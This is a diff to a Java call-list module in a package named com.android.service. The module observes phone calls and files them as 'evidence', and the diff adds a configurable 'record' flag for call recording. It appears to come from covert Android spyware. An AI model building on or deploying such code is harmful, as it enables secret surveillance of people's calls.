@@ -14,6 +14,7 @@ import com.android.service.LogR;
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfModule;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
@@ -24,9 +25,22 @@ import com.android.service.util.WChar;
 
 public class ModuleCallList extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCallList"; //$NON-NLS-1$
+	private static boolean record = false;
 
 	@Override
 	public boolean parse(ConfModule conf) {
+		if (conf.has("record")) {
+			try {
+				record = conf.getBoolean("record");
+			} catch (ConfigurationException e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				record = false;
+			}
+		}
+
 		return true;
 	}
 
@@ -39,6 +53,11 @@ public class ModuleCallList extends BaseModule implements Observer<Call> {
 	public void actualStart() {
 		ListenerCall.self().attach(this);
 
+		if (record) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
+			}
+		}
 	}
 
 	@Override
@@ -55,13 +74,15 @@ public class ModuleCallList extends BaseModule implements Observer<Call> {
 		final String note = Messages.getString("7.1"); //$NON-NLS-1$
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): " + call) ;//$NON-NLS-1$
+			Check.log(TAG + " (notification): " + call);//$NON-NLS-1$
 		}
+
 		if (call.isOngoing()) {
 			// Arrivano due call, in uscita, una con il number, l'altra senza.
 			if (call.getNumber().length() > 0) {
 				callInAction = call;
 			}
+
 			return 0;
 		}
 
